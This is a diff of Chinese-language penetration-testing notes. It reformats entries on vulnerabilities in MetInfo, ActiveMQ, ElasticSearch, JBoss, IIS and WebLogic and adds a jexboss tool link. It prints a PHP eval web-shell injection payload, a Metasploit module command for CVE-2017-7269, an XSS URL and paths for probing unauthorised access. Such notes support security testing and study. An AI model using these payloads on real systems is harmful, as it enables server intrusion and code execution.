@@ -25,7 +25,7 @@
 
 - POC | Payload | exp
 
-    `admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[1]);/*`
+    - `admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[1]);/*`
 
 ## [phpMyAdmin](https://www.phpmyadmin.net/)
 **LOAD DATA INFILE 任意文件读取漏洞**
@@ -123,7 +123,7 @@
 ## ActiveMQ
 **测试链接**
 
-`http://<ip>:8161`
+- `http://<ip>:8161`
 
 ---
 
@@ -246,14 +246,17 @@ Tomcat 默认端口为 8080，也可能被改为其他端口，后台管理路�
 ## ElasticSearch
 **未授权访问漏洞**
 
-`http://<ip>:9200`
+- `http://<ip>:9200`
 
 ---
 
 ## JBOSS
+**工具**
+- [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss)
+
 **未授权访问漏洞**
 
-`http://<ip>:8080/jmx-console`
+- `http://<ip>:8080/jmx-console`
 
 ---
 
@@ -321,7 +324,7 @@ windows 在创建一个新文件时，操作系统还会生成 8.3 格式的兼�
 
 - MSF 模块
 
-    `use exploit/windows/iis/cve-2017-7269`
+    - `use exploit/windows/iis/cve-2017-7269`
 
 ---
 
@@ -342,7 +345,7 @@ windows 在创建一个新文件时，操作系统还会生成 8.3 格式的兼�
 
 - 示例
 
-    `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `
+    - `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `
 
 **CVE-2017-10271**
 - 文章
@@ -350,7 +353,7 @@ windows 在创建一个新文件时，操作系统还会生成 8.3 格式的兼�
     - [blog-hugo/content/blog/Weblogic-0day.md](https://github.com/kylingit/blog-hugo/blob/master/content/blog/Weblogic-0day.md)
 
 - 检测方法
-    访问`<目标IP:端口>/wls-wsat/CoordinatorPortType11`
+    - `<目标IP:端口>/wls-wsat/CoordinatorPortType11`
 
 - POC | Payload | exp
     - [1337g/CVE-2017-10271](https://github.com/1337g/CVE-2017-10271)
